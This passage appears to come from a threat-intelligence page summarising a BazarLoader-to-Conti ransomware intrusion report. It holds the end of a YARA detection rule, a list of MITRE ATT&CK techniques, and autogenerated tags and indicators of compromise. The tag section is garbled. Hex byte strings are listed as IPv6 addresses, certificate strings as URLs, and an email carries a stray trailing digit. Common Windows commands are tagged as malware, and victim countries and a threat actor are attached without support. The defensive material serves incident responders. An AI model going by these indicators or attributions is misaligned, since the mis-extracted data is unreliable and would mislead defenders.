      uint16(0) == 0x5a4d and filesize < 900KB and all of them 
}


```

#### MITRE


![](https://thedfirreport.com/wp-content/uploads/2021/09/BazarLoader-to-Conti-Ransomware-in-32-Hours-1.png)


Pass the Hash – T1550.002  

Process Injection – T1055  

PowerShell – T1059.001  

Remote System Discovery – T1018  

Service Execution – T1569.002  

Windows Command Shell – T1059.003  

Account Discovery – T1087  

Domain Trust Discovery – T1482  

System Information Discovery – T1082  

Remote Services – T1021  

Windows Management Instrumentation – T1047  

Exfiltration Over Alternative Protocol – T1048  

Remote Desktop Protocol – T1021.001  

SMB/Windows Admin Shares – T1021.002  

Data Encrypted for Impact – T1486  

Security Software Discovery – T1518.001  

Query Registry – T1012


Internal case # 5087






## Tags:

#### Threatactor:
[[threatactor.name=RTM]]

#### Action:
[[action.malware.name=at]] [[action.malware.name=at]] [[action.malware.name=Bazar]] [[action.malware.name=cmd]] [[action.malware.name=cmd]] [[action.malware.name=Cobalt Strike]] [[action.malware.name=Conti]] [[action.malware.name=Emotet]] [[action.malware.name=Empire]] [[action.malware.name=Net]] [[action.malware.name=Net]] [[action.malware.name=Net Crawler]] [[action.malware.name=Nltest]] [[action.malware.name=Orz]] [[action.malware.name=Ping]] [[action.malware.name=Ping]] [[action.malware.name=PoshC2]] [[action.malware.name=PowerSploit]] [[action.malware.name=PS1]] [[action.malware.name=PS1]] [[action.malware.name=Reg]] [[action.malware.name=Reg]] [[action.malware.name=route]] [[action.malware.name=RTM]] [[action.malware.name=Ryuk]] [[action.malware.name=S-Type]] [[action.malware.name=Systeminfo]] [[action.malware.name=Systeminfo]] [[action.malware.name=Tor]]

#### Industry:
[[victim.industry.name=Accomodation]]

#### Location:
[[victim.country.name=Mali]] [[victim.continent.name=Africa]] [[victim.country.name=Oman]] [[victim.continent.name=Asia]] [[victim.country.name=Romania]] [[victim.continent.name=Europe]] [[victim.city.name=]] [[victim.country.name=Haiti]] [[victim.continent.name=North and Central America]]

### Autogenerated Tags:
[[Ransomware]] [[Bazarloader]] [[Logon]] [[Malware]] [[Dll]] [[Conti]] [[Powershell]] [[Rdp]] [[The DFIR Report]]
#### ipv4-adresses
127.0.0.1 34.219.130.241 13.56.161.214 162.244.83.216 31.14.40.160
#### ipv6-adresses
ff:5f:80:d9:5b:9b:b1:d7b1: 2e:49:c7:96:87:8e:7d:767d: d9:80:5b:d4:7a:40:21:5421: ec:10:49:d4:ee:38:57:e257: 07:6f:84:54:eb:a9:26:a626: c8:4b:fd:e8:0e:95:e0:a6e0:
#### email-adresses
ealagi@aol.com0
#### urls
http://127.0.0.1:33242/'); http://127.0.0.1:36595/'); www.sammitng.com https://thedfirreport.com https://sectigo.com/CPS0 http://crl.usertrust.com/USERTrustRSACertificationAuthority.crl0v http://ocsp.sectigo.com0
#### MITRE IDs
[[T1550.002]] [[T1059.001]] [[T1569.002]] [[T1059.003]] [[T1021.001]] [[T1021.002]] [[T1518.001]]

